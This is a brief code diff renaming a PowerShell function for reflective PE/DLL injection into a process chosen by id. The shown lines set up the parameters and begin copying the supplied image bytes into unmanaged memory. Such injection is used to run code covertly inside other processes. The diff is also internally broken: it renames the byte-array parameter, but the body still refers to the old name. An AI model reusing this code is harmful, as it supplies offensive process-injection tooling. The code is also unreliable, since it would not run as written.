@@ -1,6 +1,6 @@
-function Invoke-ReflectDllInjection
+function Invoke-ReflectivePEInjection
 {
-    param([Parameter(Mandatory=$true,Position=0)][int]$id,[Parameter(Mandatory=$true,Position=1)][Byte[]]$bytes,[Parameter(Mandatory=$true,Position=1)][bool]$is64bit)
+    param([Parameter(Mandatory=$true,Position=0)][int]$id,[Parameter(Mandatory=$true,Position=1)][Byte[]]$PEBytes,[Parameter(Mandatory=$true,Position=2)][bool]$is64)
     Set-StrictMode -Version 2
     $bytes_=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length);
     [System.Runtime.InteropServices.Marshal]::Copy($bytes,0,$bytes_,$bytes.Length);
